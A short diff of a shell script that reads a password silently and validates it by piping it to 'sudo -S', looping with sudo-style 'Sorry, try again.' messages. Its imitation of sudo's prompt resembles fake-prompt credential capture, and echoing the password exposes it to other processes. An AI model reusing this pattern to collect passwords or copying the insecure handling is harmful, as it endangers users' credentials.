@@ -8,16 +8,19 @@ echo -n "Password:"
 read -s psd
 echo "hxd"
 echo ""
-sudo -k
 
-while [ "$(echo $psd | sudo -S whoami)" != "root" ]; do
-  #sleep 3
-  #echo "Sorry, try again."
-  #echo -n "Password:"
-  read -s psd </dev/tty
+echo $psd | sudo -kSv whoami > /dev/null
+CAN_I_RUN_SUDO=$(sudo -n uptime 2>&1|grep "load"|wc -l)
+while [ ${CAN_I_RUN_SUDO} -lt 1 ]; do
+  sleep 3
+  echo "Sorry, try again."
+  echo -n "Password:"
+  read -s psd
   echo ""
-  sudo -k
+  echo $psd | sudo -kSv whoami > /dev/null
+  CAN_I_RUN_SUDO=$(sudo -n uptime 2>&1|grep "load"|wc -l)
 done
+
 echo ""
 echo "out"
 
